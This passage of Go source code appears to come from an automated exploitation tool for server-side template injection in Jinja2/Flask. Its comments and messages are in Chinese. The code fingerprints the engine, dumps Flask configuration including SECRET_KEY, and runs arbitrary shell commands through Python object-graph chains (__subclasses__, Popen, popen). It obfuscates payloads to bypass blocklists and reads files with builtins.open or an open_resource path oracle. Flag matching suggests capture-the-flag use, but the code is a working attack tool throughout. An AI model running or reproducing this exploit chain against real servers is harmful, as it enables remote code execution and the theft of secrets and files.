	j2Math, j2Mul, j2Concat := hit("{{7*7}}"), hit("{{7*'7'}}"), hit("{{'a'~'a'}}")
	var conclusion string
	switch {
	case j2Math && j2Mul:
		conclusion = "判定: 目标为 Jinja2/Flask（7*7 与 7*'7' 双命中）"
	case j2Math:
		conclusion = "判定: 疑似通用 {{ }} 引擎（7*7 命中但 Jinja2 特有探针未命中，考虑 Twig/Nunjucks）"
	case j2Concat:
		conclusion = "判定: Jinja2/Twig 语法激活（无数字探针命中；数字探针被过滤，注入点存在黑名单）"
	default:
		conclusion = "判定: 探针未命中，注入点可能未渲染、非该引擎或过滤极严"
	}
	*report = append(*report, conclusion)
	var sigSorted []string
	for s := range signals {
		sigSorted = append(sigSorted, s)
	}
	sort.Strings(sigSorted)
	return map[string]any{"success": true, "probes": results, "conclusion": conclusion, "signals": sigSorted}, nil
}

func (t *sstiJinja2Tool) runInfo(h *sstiHttp, baseline string, report *[]string,
	pacer *sstiPacer, signals map[string]bool) (map[string]any, error) {
	probes := [][2]string{
		{"{{config}}", "Flask 配置（SECRET_KEY 等）"},
		{"{{request.environ}}", "WSGI 环境（注意: Werkzeug 2.x 起不含 os.environ）"},
	}
	collected := map[string]any{}
	for _, p := range probes {
		status, body, err := pacer.send(h, p[0], nil)
		if err != nil {
			return nil, err
		}
		cls := sstiClassify(body, baseline, status)
		if cls == "blocked" || cls == "too_long" || cls == "rate_limit" {
			signals[cls] = true
		}
		*report = append(*report, fmt.Sprintf("[信息] %s → HTTP %s 判定=%s（%s）", p[0], httpStatusStr(status), cls, p[1]))
		if cls == "ok" {
			ex := sstiExcerpt(body, 3000)
			collected[p[0]] = ex
			*report = append(*report, "  └─ "+ex)
		} else {
			*report = append(*report, fmt.Sprintf("  └─ 未获取（%s）", cls))
		}
	}
	return map[string]any{"success": true, "collected": collected}, nil
}

// ---------------------------------------------------------------------------
// exec
// ---------------------------------------------------------------------------

func (t *sstiJinja2Tool) runExec(h *sstiHttp, baseline, command string, report *[]string,
	pacer *sstiPacer, signals map[string]bool, blockedWords []string, maxLength int,
	quietGuidance bool) (map[string]any, error) {
	marker := sstiRandMarker()
	wrapped := sstiWrapCmd(command, marker)
	cmdExpr := sstiQuote(wrapped)
	if len(blockedWords) > 0 {
		cmdExpr = sstiObfuscateStr(wrapped, blockedWords)
	}
	var tried []map[string]any

	attempt := func(label, payload string, extraQuery [][2]string) (string, string, error) {
		if !sstiFits(payload, maxLength) {
			tried = append(tried, sstiTriedEntryMake(label, "skipped", -1, payload))
			*report = append(*report, fmt.Sprintf("[exec] %s → 跳过（长度 %d > 上限 %d）", label, pyLen(payload), maxLength))
			return "", "skipped", nil
		}
		status, body, err := pacer.send(h, payload, extraQuery)
		if err != nil {
			return "", "", err
		}
		cls := sstiClassify(body, baseline, status)
		if cls == "blocked" || cls == "too_long" || cls == "rate_limit" {
			signals[cls] = true
		}
		tried = append(tried, sstiTriedEntryMake(label, cls, status, payload))
		*report = append(*report, fmt.Sprintf("[exec] %s（%d 字符）→ HTTP %s 判定=%s", label, pyLen(payload), httpStatusStr(status), cls))
		*report = append(*report, sstiPocLine(payload))
		if cls != "ok" {
			return "", cls, nil
		}
		out, ok := sstiExtractBetween(body, marker)
		if !ok || out == "" {
			*report = append(*report, "  └─ 响应变化但无标记输出（命令可能无回显）")
			return "", cls, nil
		}
		*report = append(*report, "  └─ 命中！命令输出:")
		for _, line := range strings.Split(out, "\n") {
			*report = append(*report, "     "+line)
		}
		return out, cls, nil
	}

	// 1) 入口链 × 取 os 方式
	blacklistHits := 0
outer:
	for _, ec := range sstiEntryChains {
		entry, ge := ec[0], ec[1]
		for _, tpl := range sstiExecTemplates {
			payload := "{{" + strings.ReplaceAll(strings.ReplaceAll(tpl, "{entry}", ge), "{cmd}", cmdExpr) + "}}"
			out, cls, err := attempt("入口 "+entry, payload, nil)
			if err != nil {
				return nil, err
			}
			if out != "" {
				return map[string]any{"success": true, "chain": entry, "output": out, "tried": tried}, nil
			}
			if cls == "blocked" || cls == "too_long" {
				blacklistHits++
			} else {
				blacklistHits = 0
			}
			if blacklistHits >= 2 {
				*report = append(*report, "[exec] 连续命中黑名单/长度过滤，同类对象图链提前跳过（节省请求）")
				break outer
			}
		}
	}

	// 2) 子类枚举二段式
	if !signals["blocked"] && !signals["too_long"] {
		out, err := t.runSubclassEnum(h, baseline, wrapped, report, pacer, signals, attempt, &tried, maxLength)
		if err != nil {
			return nil, err
		}
		if out != "" {
			return map[string]any{"success": true, "chain": "subclasses", "output": out, "tried": tried}, nil
		}
	} else {
		*report = append(*report, "[exec] 黑名单/长度过滤下跳过子类枚举（class/mro/subclasses 大概率被封）")
	}

	// 3) 绕过变体
	for _, b := range sstiExecBypasses {
		payload := "{{" + strings.ReplaceAll(b.tpl, "{cmd}", cmdExpr) + "}}"
		var extra [][2]string
		if b.needsArgs {
			extra = [][2]string{{"a", wrapped}, {"m", "subprocess"}}
		}
		out, _, err := attempt(b.label, payload, extra)
		if err != nil {
			return nil, err
		}
		if out != "" {
			return map[string]any{"success": true, "chain": b.label, "output": out, "tried": tried}, nil
		}
	}

	*report = append(*report, "[exec] 全部链未命中。")
	if len(signals) > 0 {
		var sig []string
		for s := range signals {
			sig = append(sig, s)
		}
		sort.Strings(sig)
		*report = append(*report, fmt.Sprintf("[exec] 观察到的过滤信号: %s", strings.Join(sig, ", ")))
	}
	// Python all(t["class"] == "skipped" for t in tried)：空列表也为 True
	allSkipped := true
	for _, e := range tried {
		if cls, _ := e["class"].(string); cls != "skipped" {
			allSkipped = false
			break
		}
	}
	if !quietGuidance && ((signals["blocked"] || signals["too_long"]) || (maxLength > 0 && allSkipped)) {
		*report = append(*report, "[exec] 提示: 黑名单/长度过滤通常封死对象图 RCE 桥（__init__/__globals__/"+
			"__class__），最短 RCE 链也要 86+ 字符；但 open_resource 链不需要这些桥——")
		tail := ""
		if maxLength > 0 {
			if maxLength >= 57 {
				tail = fmt.Sprintf("，≤%d 可用", maxLength)
			} else {
				tail = "，仍超上限时可单跑 oracle"
			}
		}
		*report = append(*report, "        建议改用 read_file 模式，配合路径 oracle 自动定位并读取 flag"+
			fmt.Sprintf("（open_resource 读链最短 57 字符%s）。", tail))
	}
	return map[string]any{"success": false, "chain": nil, "output": nil, "tried": tried,
		"hint": "建议 read_file 模式（open_resource 链 + 路径 oracle）"}, nil
}

// runSubclassEnum 二段式子类枚举。
func (t *sstiJinja2Tool) runSubclassEnum(h *sstiHttp, baseline, wrapped string, report *[]string,
	pacer *sstiPacer, signals map[string]bool,
	attempt func(label, payload string, extra [][2]string) (string, string, error),
	tried *[]map[string]any, maxLength int) (string, error) {
	probe := "{{''.__class__.__mro__[1].__subclasses__()}}"
	if !sstiFits(probe, maxLength) {
		*report = append(*report, "[exec] 子类枚举探针超长，跳过二段式")
		return "", nil
	}
	status, body, err := pacer.send(h, probe, nil)
	if err != nil {
		return "", err
	}
	cls := sstiClassify(body, baseline, status)
	if cls == "blocked" || cls == "too_long" || cls == "rate_limit" {
		signals[cls] = true
	}
	if cls != "ok" {
		*report = append(*report, "[exec] 子类枚举 → 未取得子类列表，跳过二段式")
		*report = append(*report, sstiPocLine(probe))
		return "", nil
	}
	classes := sstiClassesRe.FindAllStringSubmatch(body, -1)
	if len(classes) == 0 {
		*report = append(*report, "[exec] 子类枚举 → 无法解析子类 repr，跳过")
		return "", nil
	}
	targetIdx, targetKind := -1, ""
	for idx, m := range classes {
		name := m[1]
		if name == "subprocess.Popen" {
			targetIdx, targetKind = idx, "Popen"
			break
		}
		if name == "os._wrap_close" {
			targetIdx, targetKind = idx, "wrap_close"
			break
		}
	}
	if targetIdx < 0 {
		*report = append(*report, "[exec] 子类枚举 → 未找到 subprocess.Popen / os._wrap_close，跳过")
		return "", nil
	}
	*report = append(*report, fmt.Sprintf("[exec] 子类枚举 → 找到 %s @ index %d", targetKind, targetIdx))
	var payload string
	if targetKind == "Popen" {
		payload = "{{''.__class__.__mro__[1].__subclasses__()[" + strconv.Itoa(targetIdx) + "](" +
			sstiQuote(wrapped) + ",shell=True,stdout=-1).communicate()[0].decode()}}"
	} else {
		payload = "{{''.__class__.__mro__[1].__subclasses__()[" + strconv.Itoa(targetIdx) +
			"].__init__.__globals__['popen'](" + sstiQuote(wrapped) + ").read()}}"
	}
	out, _, err := attempt("子类枚举二段式", payload, nil)
	if err != nil {
		return "", err
	}
	return out, nil
}

// ---------------------------------------------------------------------------
// read_file
// ---------------------------------------------------------------------------

func (t *sstiJinja2Tool) runRead(h *sstiHttp, baseline, filePath string, report *[]string,
	pacer *sstiPacer, signals map[string]bool, blockedWords []string, maxLength int) (map[string]any, error) {
	// 阶段 1: exec 链 cat 兜底（RCE 可达时最可靠）
	*report = append(*report, "[read] 阶段 1: 尝试 exec 链 cat（RCE 可达时最可靠）")
	execData, err := t.runExec(h, baseline, "cat "+filePath, report, pacer, signals, blockedWords, maxLength, true)
	if err != nil {
		return nil, err
	}
	if boolVal(execData["success"]) {
		return map[string]any{"success": true, "method": "exec-cat", "chain": execData["chain"],
			"content": execData["output"], "tried": execData["tried"]}, nil
	}

	adaptive := len(blockedWords) > 0 || signals["blocked"] || signals["too_long"] || maxLength > 0
	if adaptive {
		*report = append(*report, "[read] 检测到黑名单/长度过滤 → CaaS1 式自适应阶梯（open_resource 优先）")
		data, err := t.readOpenResource(h, baseline, filePath, report, pacer, signals, blockedWords, maxLength, true)
		if err != nil {
			return nil, err
		}
		if data != nil {
			return data, nil
		}
		data, err = t.readBuiltins(h, baseline, filePath, report, pacer, signals, maxLength)
		if err != nil {
			return nil, err
		}
		if data != nil {
			return data, nil
		}
	} else {
		data, err := t.readBuiltins(h, baseline, filePath, report, pacer, signals, maxLength)
		if err != nil {
			return nil, err
		}
		if data != nil {
			return data, nil
		}
		data, err = t.readOpenResource(h, baseline, filePath, report, pacer, signals, blockedWords, maxLength, false)
		if err != nil {
			return nil, err
		}
		if data != nil {
			return data, nil
		}
	}
	return map[string]any{"success": false, "method": nil, "content": nil}, nil
}

// readBuiltins 阶段 2：builtins.open 对象图读取。
func (t *sstiJinja2Tool) readBuiltins(h *sstiHttp, baseline, filePath string, report *[]string,
	pacer *sstiPacer, signals map[string]bool, maxLength int) (map[string]any, error) {
	marker := sstiRandMarker()
	var tried []map[string]any
	pathExpr := sstiQuote(filePath)

	attemptRead := func(label, payload string) (string, error) {
		if !sstiFits(payload, maxLength) {
			tried = append(tried, sstiTriedEntryMake(label, "skipped", -1, payload))
			*report = append(*report, fmt.Sprintf("[read] %s → 跳过（长度 %d > 上限 %d）", label, pyLen(payload), maxLength))
			return "", nil
		}
		status, body, err := pacer.send(h, payload, nil)
		if err != nil {
			return "", err
		}
		cls := sstiClassify(body, baseline, status)
		if cls == "blocked" || cls == "too_long" || cls == "rate_limit" {
			signals[cls] = true
		}
		tried = append(tried, sstiTriedEntryMake(label, cls, status, payload))
		*report = append(*report, fmt.Sprintf("[read] %s（%d 字符）→ HTTP %s 判定=%s", label, pyLen(payload), httpStatusStr(status), cls))
		*report = append(*report, sstiPocLine(payload))
		if cls != "ok" {
			return "", nil
		}
		out, _ := sstiExtractBetween(body, marker)
		if out == "" {
			out = sstiExcerpt(body, 3000)
		}
		r := []rune(out)
		shown := out
		if len(r) > 500 {
			shown = string(r[:500])
		}
		*report = append(*report, "  └─ 内容: "+shown)
		return out, nil
	}

	*report = append(*report, "[read] 阶段 2: builtins.open 对象图读取")
	for _, ec := range sstiEntryChains {
		entry, ge := ec[0], ec[1]
		for _, tpl := range sstiFileOpenTemplates {
			payload := "{{" + strings.ReplaceAll(strings.ReplaceAll(tpl, "{entry}", ge), "{path}", pathExpr) + "}}"
			out, err := attemptRead("open 入口 "+entry, payload)
			if err != nil {
				return nil, err
			}
			if out != "" {
				data := map[string]any{"success": true, "method": "builtins.open", "chain": entry,
					"content": out, "tried": tried}
				if m := sstiFlagRe.FindString(out); m != "" {
					data["flag"] = m
				} else {
					data["flag"] = nil
				}
				return data, nil
			}
		}
		for _, tpl := range sstiFileIterTemplates {
			payload := "{{" + strings.ReplaceAll(strings.ReplaceAll(tpl, "{entry}", ge), "{path}", pathExpr) + "}}"
			out, err := attemptRead("迭代器入口 "+entry, payload)
			if err != nil {
				return nil, err
			}
			if out != "" {
				data := map[string]any{"success": true, "method": "builtins.open+__next__", "chain": entry,
					"content": out, "tried": tried}
				if m := sstiFlagRe.FindString(out); m != "" {
					data["flag"] = m
				} else {
					data["flag"] = nil
				}
				return data, nil
			}
		}
	}
	return nil, nil
}

// readOpenResource 阶段 3+4：open_resource 链 + 路径 oracle。
func (t *sstiJinja2Tool) readOpenResource(h *sstiHttp, baseline, filePath string, report *[]string,
	pacer *sstiPacer, signals map[string]bool, blockedWords []string, maxLength int,
	blocked bool) (map[string]any, error) {
	marker := sstiRandMarker()
	var tried []map[string]any
	templates := sstiOpenResourceRead
	if blocked {
		templates = sstiOpenResourceReadBlocked
	}
	pathExprs := sstiPathExprs(filePath, blockedWords, blocked)

	attemptRead := func(label, payload string) (string, error) {
		if !sstiFits(payload, maxLength) {
			tried = append(tried, sstiTriedEntryMake(label, "skipped", -1, payload))
			*report = append(*report, fmt.Sprintf("[read] %s → 跳过（长度 %d > 上限 %d）", label, pyLen(payload), maxLength))
			return "", nil
		}
		status, body, err := pacer.send(h, payload, nil)
		if err != nil {
			return "", err
		}
		cls := sstiClassify(body, baseline, status)
		if cls == "blocked" || cls == "too_long" || cls == "rate_limit" {
			signals[cls] = true
		}
		tried = append(tried, sstiTriedEntryMake(label, cls, status, payload))
		*report = append(*report, fmt.Sprintf("[read] %s（%d 字符）→ HTTP %s 判定=%s", label, pyLen(payload), httpStatusStr(status), cls))
		*report = append(*report, sstiPocLine(payload))
		if cls != "ok" {
			return "", nil
		}
		out, _ := sstiExtractBetween(body, marker)
		if out == "" {
			out = sstiExcerpt(body, 3000)
		}
		r := []rune(out)
		shown := out
		if len(r) > 500 {
			shown = string(r[:500])
		}
		*report = append(*report, "  └─ 内容: "+shown)
		return out, nil
	}

	*report = append(*report, "[read] 阶段 3: Flask open_resource（request.json_module._app）")
	for _, expr := range pathExprs {
		for _, tpl := range templates {
			payload := "{{" + strings.ReplaceAll(tpl, "{path}", expr) + "}}"
			out, err := attemptRead("open_resource["+expr+"]", payload)
			if err != nil {
				return nil, err
			}
			if out != "" {
				data := map[string]any{"success": true, "method": "open_resource",
					"chain": "request.json_module", "content": out, "tried": tried}
				if m := sstiFlagRe.FindString(out); m != "" {
					data["flag"] = m
				} else {
					data["flag"] = nil
				}
				return data, nil
			}
		}
	}

	// 阶段 4: 路径 oracle
	*report = append(*report, "[read] 阶段 4: 路径 oracle（open 不读 → repr 泄露真实路径）")
	var candidates []string
	candidates = append(candidates, filePath)
	for _, c := range sstiFlagCandidates {
		if c != filePath {
			candidates = append(candidates, c)
		}
	}
	var leakedPaths []string
	for _, cand := range candidates {
		for _, expr := range sstiPathExprs(cand, blockedWords, blocked) {
			payload := "{{" + strings.ReplaceAll(sstiOpenResourceOracle, "{path}", expr) + "}}"
			if !sstiFits(payload, maxLength) {
				tried = append(tried, sstiTriedEntryMake("oracle["+expr+"]", "skipped", -1, payload))
				continue
			}
			status, body, err := pacer.send(h, payload, nil)
			if err != nil {
				return nil, err
			}
			cls := sstiClassify(body, baseline, status)
			if cls == "blocked" || cls == "too_long" || cls == "rate_limit" {
				signals[cls] = true
			}
			tried = append(tried, sstiTriedEntryMake("oracle["+expr+"]", cls, status, payload))
			*report = append(*report, fmt.Sprintf("[read] oracle[%s]（%d 字符）→ HTTP %s 判定=%s", expr, pyLen(payload), httpStatusStr(status), cls))
			*report = append(*report, sstiPocLine(payload))
			if cls != "ok" {
				continue
			}
			m := sstiPathInReprRe.FindStringSubmatch(sstiHTMLUnescape(body))
			if m == nil {
				*report = append(*report, "  └─ open 成功但未解析到路径（非文件对象响应）")
				continue
			}
			leaked := m[1]
			*report = append(*report, "  └─ 泄露真实路径: "+leaked)
			already := false
			for _, lp := range leakedPaths {
				if lp == leaked {
					already = true
					break
				}
			}
			if already {
				continue
			}
			leakedPaths = append(leakedPaths, leaked)
			for _, expr2 := range sstiPathExprs(leaked, blockedWords, blocked) {
				for _, tpl := range templates {
					payload2 := "{{" + strings.ReplaceAll(tpl, "{path}", expr2) + "}}"
					out, err := attemptRead("open_resource[泄露路径 "+expr2+"]", payload2)
					if err != nil {
						return nil, err
					}
					if out != "" {
						data := map[string]any{"success": true, "method": "open_resource+oracle",
							"chain": "request.json_module", "content": out,
							"leaked_path": leaked, "tried": tried}
						if m := sstiFlagRe.FindString(out); m != "" {
							data["flag"] = m
						} else {
							data["flag"] = nil
						}
						return data, nil
					}
				}
			}
			*report = append(*report, "  └─ 泄露路径重读未命中，继续扫描其他候选")
		}
	}
	if len(leakedPaths) > 0 {
		return map[string]any{"success": true, "method": "open_resource-oracle", "content": leakedPaths[0],
			"leaked_paths": leakedPaths, "tried": tried,
			"note": "已泄露路径但重读失败（可能 read/__next__ 也被封）"}, nil
	}
	return nil, nil
}
